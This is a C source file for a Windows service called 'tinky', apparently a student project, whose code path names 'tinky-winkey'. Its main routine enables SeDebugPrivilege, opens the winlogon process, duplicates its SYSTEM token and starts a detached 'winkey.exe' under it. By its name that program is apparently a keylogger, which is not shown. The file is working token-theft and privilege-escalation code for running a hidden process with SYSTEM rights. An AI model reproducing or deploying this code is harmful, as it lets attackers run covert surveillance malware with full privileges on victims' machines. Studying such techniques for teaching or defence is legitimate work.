#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tchar.h>
#include <strsafe.h>

#pragma comment(lib, "advapi32.lib")

#define SVCNAME TEXT("tinky")

SERVICE_STATUS          gSvcStatus; 
SERVICE_STATUS_HANDLE   gSvcStatusHandle; 
HANDLE                  ghSvcStopEvent = NULL;

VOID SvcInstall(void);
VOID WINAPI SvcCtrlHandler( DWORD ); 
VOID WINAPI SvcMain(); 
VOID WINAPI SvcInit(); 

VOID ReportSvcStatus( DWORD, DWORD, DWORD );

DWORD getWinlogonPID();


BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		printf("[-] The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

void impersonateUserToken(STARTUPINFO* si, PROCESS_INFORMATION* pi)
{
    HANDLE winlogonTokenHandle;
    HANDLE winlogonDuplicateTokenHandle;

    DWORD winlogonPID = getWinlogonPID();
    if (winlogonPID == -1)
    	printf("Failed to get winlogon PID");

    HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentTokenHandle);
	if (SetPrivilege(currentTokenHandle, "SeDebugPrivilege", TRUE))
	{
		printf("[+] SeDebugPrivilege enabled!\n");
	}

    HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, winlogonPID);
	if (GetLastError() == NULL)
		printf("[+] OpenProcess() success!\n");
	else
	{
		printf("[-] OpenProcess() Return Code: %i\n", processHandle);
		printf("[-] OpenProcess() Error: %i\n", GetLastError());
	}
	
	// Call OpenProcessToken(), print return code and error code
	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &winlogonTokenHandle);
	if (GetLastError() == NULL)
		printf("[+] OpenProcessToken() success!\n");
	else
	{
		printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
		printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
	}
	
	CloseHandle(processHandle);

	// Call DuplicateTokenEx(), print return code and error code
	BOOL duplicateToken = DuplicateTokenEx(winlogonTokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &winlogonDuplicateTokenHandle);
	if (GetLastError() == NULL)
		printf("[+] DuplicateTokenEx() success!\n");
	else
	{
		printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
		printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
	}
    CloseHandle(winlogonTokenHandle);

	/* Open the winkey process, detached with the token */
	CreateProcessAsUser(winlogonDuplicateTokenHandle,
		TEXT("c:\\Users\\Titouan\\Documents\\42\\tinky-winkey\\winkey.exe"),
		NULL,
		NULL,
		NULL,
		FALSE,
		NORMAL_PRIORITY_CLASS | DETACHED_PROCESS,
		NULL,
		NULL,
		si,
		pi
	);

	CloseHandle(winlogonDuplicateTokenHandle);
}

void WINAPI SvcMain()
{
    // Register the handler function for the service

    gSvcStatusHandle = RegisterServiceCtrlHandler( 
        SVCNAME, 
        (LPHANDLER_FUNCTION)(SvcCtrlHandler)
       );

    if( !gSvcStatusHandle )
    { 
        printf("RegisterServiceCtrlHandler failed (%d)\n", GetLastError()); 
        return; 
    } 

    // These SERVICE_STATUS members remain as set here

    gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; 
    gSvcStatus.dwServiceSpecificExitCode = 0;    

    // Report initial status to the SCM

    ReportSvcStatus( SERVICE_START_PENDING, NO_ERROR, 3000 );

    // Perform service-specific initialization and work.

    SvcInit();
}

void WINAPI SvcInit()
{
    ghSvcStopEvent = CreateEvent(
                         NULL,    // default security attributes
                         TRUE,    // manual reset event
                         FALSE,   // not signaled
                         NULL
    );

    if ( ghSvcStopEvent == NULL)
    {
        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
        return;
    }

    ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);

    STARTUPINFO si = {0};
	PROCESS_INFORMATION pi = {0};

    impersonateUserToken(&si, &pi);

    while (1)
    {
        WaitForSingleObject(ghSvcStopEvent, INFINITE);
        ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
        break;
    }

    if (pi.hProcess) {
		TerminateProcess(pi.hProcess, 0);
	}

	/* Cleanup handles */
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(si.hStdInput);
	CloseHandle(si.hStdError);
	CloseHandle(si.hStdOutput);
}

VOID ReportSvcStatus( DWORD dwCurrentState,
                      DWORD dwWin32ExitCode,
                      DWORD dwWaitHint)
{
    static DWORD dwCheckPoint = 1;

    // Fill in the SERVICE_STATUS structure.

    gSvcStatus.dwCurrentState = dwCurrentState;
    gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
    gSvcStatus.dwWaitHint = dwWaitHint;

    if (dwCurrentState == SERVICE_START_PENDING)
        gSvcStatus.dwControlsAccepted = 0;
    else gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    if ( (dwCurrentState == SERVICE_RUNNING) ||
           (dwCurrentState == SERVICE_STOPPED) )
        gSvcStatus.dwCheckPoint = 0;
    else gSvcStatus.dwCheckPoint = dwCheckPoint++;

    // Report the status of the service to the SCM.
    SetServiceStatus( gSvcStatusHandle, &gSvcStatus );
}

VOID WINAPI SvcCtrlHandler( DWORD dwCtrl )
{
   // Handle the requested control code. 

   switch(dwCtrl) 
   {  
      case SERVICE_CONTROL_STOP: 
         ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);

         // Signal the service to stop.

         SetEvent(ghSvcStopEvent);
         ReportSvcStatus(gSvcStatus.dwCurrentState, NO_ERROR, 0);
         
         return;
 
      case SERVICE_CONTROL_INTERROGATE: 
         break; 
 
      default: 
         break;
   } 
   
}

int __cdecl _tmain(int argc, TCHAR *argv[]) 
{ 

    // TO_DO: Add any additional services for the process to this table.
    SERVICE_TABLE_ENTRY DispatchTable[] = 
    { 
        { (LPSTR)("tinky"), (LPSERVICE_MAIN_FUNCTION)(SvcMain)}, 
        { NULL, NULL } 
    }; 
 
    // This call returns when the service has stopped. 
    // The process should simply terminate when the call returns.

    if (!StartServiceCtrlDispatcher( DispatchTable )) 
    { 
        printf("StartServiceCtrlDispatcher failed (%d)\n", GetLastError()); 
    } 
    return 0;
} 

